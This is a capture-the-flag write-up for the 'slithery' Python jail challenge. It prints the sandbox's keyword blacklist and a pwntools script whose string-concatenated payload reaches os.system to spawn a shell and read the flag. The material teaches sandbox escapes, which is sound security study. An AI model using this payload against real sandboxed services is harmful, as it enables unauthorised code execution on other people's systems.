# slithery (Pwn, 100 points)

> Setting up a new coding environment for my data science students. Some of them
> are l33t h4ck3rs that got RCE and crashed my machine a few times :(. Can you
> help test this before I use it for my class? Two sandboxes should be better than
> one...
> 
> nc pwn.chal.csaw.io 5011

This challenge is a Python jail escape and lucky for me our team had just done 
one few weekends ago so I was fairly familiar with the tricks to break out. They
provided the `sandbox.py` that was running, so we need to figure out how to get
around it. The important part is this but they don't tell us the blacklist.

```python
command = input(">>> ")
if any([x in command for x in blacklist.BLACKLIST]):
    raise Exception("not allowed!!")
```

The first step of these challenges is usually to find out what sort of globals
or builtins are available and then figure out how to use them to your
advantage. Nice for us it's not that restricted so we can run the following
commands to see what globals are available and what's on the blacklist.

```sh
>>> print(globals())
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f3f787d1c40>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': 'sandbox.py', '__cached__': None, 'b64decode': <function b64decode at 0x7f3f7868e940>, 'blacklist': <module 'blacklist' from '/home/slithery/blacklist.py'>, 'main': <function main at 0x7f3f786dedc0>}

>>> print(blacklist.BLACKLIST)
['__builtins__', '__import__', 'eval', 'exec', 'import', 'from', 'os', 'sys', 'system', 'timeit', 'base64commands', 'subprocess', 'pty', 'platform', 'open', 'read', 'write', 'dir', 'type']
```

Because it only checks our input for full-words matches in the blacklist, we can
bypass that by concatenating strings and open up a shell. Running our exploit:

```sh
$ python3 exploit.py
[+] Opening connection to pwn.chal.csaw.io on port 5011: Done
[*] Switching to interactive mode
$ id
uid=1000(slithery) gid=1000(slithery) groups=1000(slithery)
$ cat flag.txt
flag{y4_sl1th3r3d_0ut}
```

## Exploit Script

```python
from pwn import *

def exploit():
    try:
        io = remote("pwn.chal.csaw.io", 5011)
        p = "globals()['_'+'_builtins__'].__dict__['__i'+'mport__']('o'+'s').__dict__['s'+'ystem']('sh')"
        io.sendlineafter(">>> ", p)
        io.interactive()
    finally:
        io.close()

exploit()
```

